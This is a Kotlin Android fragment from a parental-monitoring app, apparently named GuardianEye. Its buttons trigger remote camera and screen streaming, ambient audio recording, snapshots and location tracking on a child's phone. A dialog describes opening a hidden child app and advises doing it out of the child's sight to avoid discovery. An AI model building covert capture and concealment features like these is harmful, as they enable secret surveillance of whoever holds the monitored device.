package com.parent.monitor

import android.app.AlertDialog
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Switch
import android.widget.TextView
import androidx.fragment.app.Fragment
import org.json.JSONObject

class DeviceTabFragment : Fragment() {

    private var tvDeviceName: TextView? = null
    private var tvDeviceStatus: TextView? = null
    private var tvDeviceBattery: TextView? = null
    private var devStatusDot: View? = null
    private var switchBlockApps: Switch? = null
    private var tvLocationAddress: TextView? = null
    private var tvLocationUpdate: TextView? = null
    private var cardPermBanner: View? = null

    companion object {
        const val TAB_LIVE       = 1
        const val TAB_LIMITS     = 7
        const val TAB_PROTECT    = 8
        const val TAB_TRACK      = 9
        const val TAB_REPORTS    = 10
        const val TAB_DATA       = 11
        const val TAB_PAINTINGS  = 18
        const val TAB_CALL_SAFETY = 21
        const val TAB_SOCIAL     = 25
        const val TAB_ALBUMS     = 17
        const val TAB_BROWSER    = 14
        const val TAB_SNAPSHOTS  = 24
        const val TAB_APPS       = 2
    }

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View =
        inflater.inflate(R.layout.fragment_device_tab, container, false)

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        tvDeviceName      = view.findViewById(R.id.tvDeviceName)
        tvDeviceStatus    = view.findViewById(R.id.tvDeviceStatus)
        tvDeviceBattery   = view.findViewById(R.id.tvDeviceBattery)
        devStatusDot      = view.findViewById(R.id.devStatusDot)
        switchBlockApps   = view.findViewById(R.id.switchBlockApps)
        tvLocationAddress = view.findViewById(R.id.tvLocationAddress)
        tvLocationUpdate  = view.findViewById(R.id.tvLocationUpdate)
        cardPermBanner    = view.findViewById(R.id.cardPermBanner)

        setupClickListeners(view)
    }

    private fun setupClickListeners(v: View) {
        val nav = { tab: Int -> (activity as? MainActivity)?.openFragment(tab) }

        // Dismiss permission banner
        v.findViewById<View>(R.id.btnDismissBanner)?.setOnClickListener {
            cardPermBanner?.visibility = View.GONE
        }

        // Live Monitoring
        v.findViewById<View>(R.id.btnRemoteCamera)?.setOnClickListener { nav(TAB_LIVE) }
        v.findViewById<View>(R.id.btnScreenMirror)?.setOnClickListener { nav(TAB_LIVE) }
        v.findViewById<View>(R.id.btnOneWayAudio)?.setOnClickListener { nav(TAB_LIVE) }

        // Block All Apps toggle
        switchBlockApps?.setOnCheckedChangeListener { _, checked ->
            val main = activity as? MainActivity
            val cmd = JSONObject().apply {
                put("type", "command")
                put("command", "whitelist_mode")
                put("enabled", checked)
            }
            main?.sendToChild(cmd)
        }

        // Location
        v.findViewById<View>(R.id.cardLocation)?.setOnClickListener { nav(TAB_TRACK) }
        v.findViewById<View>(R.id.btnOpenMap)?.setOnClickListener { nav(TAB_TRACK) }

        // Snapshot & Recording
        v.findViewById<View>(R.id.btnCamRecord)?.setOnClickListener {
            (activity as? MainActivity)?.sendCommand("start_camera_stream")
        }
        v.findViewById<View>(R.id.btnScreenRecord)?.setOnClickListener {
            (activity as? MainActivity)?.sendCommand("start_screen_stream")
        }
        v.findViewById<View>(R.id.btnAmbientRecord)?.setOnClickListener {
            (activity as? MainActivity)?.sendCommand("start_ambient_record")
        }
        v.findViewById<View>(R.id.btnCamSnapshot)?.setOnClickListener {
            (activity as? MainActivity)?.sendCommand("snapshot_now")
        }
        v.findViewById<View>(R.id.btnScreenSnapshot)?.setOnClickListener {
            (activity as? MainActivity)?.sendCommand("take_screenshot")
        }

        // Device Activity
        v.findViewById<View>(R.id.btnScreenTime)?.setOnClickListener { nav(TAB_LIMITS) }
        v.findViewById<View>(R.id.btnAppTime)?.setOnClickListener { nav(TAB_APPS) }
        v.findViewById<View>(R.id.btnAppRules)?.setOnClickListener { nav(TAB_PROTECT) }
        v.findViewById<View>(R.id.btnUsageLogs)?.setOnClickListener { nav(TAB_DATA) }
        v.findViewById<View>(R.id.btnLivePainting)?.setOnClickListener { nav(TAB_PAINTINGS) }
        v.findViewById<View>(R.id.btnCheckPerms)?.setOnClickListener {
            (activity as? MainActivity)?.sendCommand("get_health_status")
        }

        // Usage Safety
        v.findViewById<View>(R.id.btnSocialDetect)?.setOnClickListener { nav(TAB_SOCIAL) }
        v.findViewById<View>(R.id.btnCallSms)?.setOnClickListener { nav(TAB_CALL_SAFETY) }
        v.findViewById<View>(R.id.btnAlbums)?.setOnClickListener { nav(TAB_ALBUMS) }
        v.findViewById<View>(R.id.btnBrowserSafety)?.setOnClickListener { nav(TAB_BROWSER) }

        // How to open child's app
        v.findViewById<View>(R.id.cardHowToOpen)?.setOnClickListener {
            showHiddenAppDialog()
        }
    }

    fun setOnlineStatus(online: Boolean) {
        devStatusDot?.setBackgroundResource(if (online) R.drawable.circle_green else R.drawable.circle_orange)
        tvDeviceStatus?.text = if (online) "Online" else "Offline"
    }

    fun updateBattery(pct: Int, charging: Boolean) {
        tvDeviceBattery?.text = if (pct >= 0) "$pct%${if (charging) "⚡" else ""}" else "--%"
    }

    fun updateDeviceName(name: String) {
        tvDeviceName?.text = name
    }

    fun updateLocation(lat: Double, lng: Double) {
        tvLocationAddress?.text = "Lat: %.5f, Lng: %.5f".format(lat, lng)
        tvLocationUpdate?.text = "Updated just now"
    }

    fun showPermissionBanner() {
        cardPermBanner?.visibility = View.VISIBLE
    }

    private fun showHiddenAppDialog() {
        val ctx = context ?: return
        AlertDialog.Builder(ctx)
            .setTitle("How to open the hidden child's app?")
            .setMessage(
                "Method 1: Get the child's device, unlock the screen, and tap the button in GuardianEye parent app to open the child app.\n\n" +
                "Method 2: Use the child's phone browser to access the app link and open it directly.\n\n" +
                "Note: Do not open the child app when the child is present to avoid discovery."
            )
            .setPositiveButton("OK", null)
            .show()
    }
}
